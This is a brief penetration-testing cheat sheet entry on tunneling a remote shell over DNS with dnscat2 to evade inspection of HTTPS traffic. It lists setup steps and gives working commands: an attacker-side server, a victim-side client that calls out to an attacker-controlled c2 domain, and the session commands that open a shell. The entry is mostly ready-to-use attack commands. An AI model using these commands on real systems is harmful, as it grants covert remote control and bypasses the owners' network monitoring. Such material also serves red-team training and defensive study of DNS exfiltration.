# 14.01 DNS Tunneling with dnscat2

> Encode a shell over DNS queries with `dnscat2` when even HTTPS is inspected — slow but evades most DPI.

## Overview

When even HTTPS is filtered/inspected but DNS still escapes, dnscat2 encodes a shell over DNS queries to an attacker-controlled domain. Slow but evades many DPI deployments.

## Steps

- **Set up NS delegation** — your <LHOST> → your server.
- **Run dnscat2 server**.
- **Drop client on victim** — connects out via DNS.

## Commands

### dnscat2

```bash
# Attacker
ruby ./dnscat2.rb c2.<LHOST> --no-cache
# Victim (compile Windows or Linux client)
./dnscat2 --dns server=8.8.8.8 c2.<LHOST>
# Inside dnscat2 prompt
windows; window -i 1; shell
```
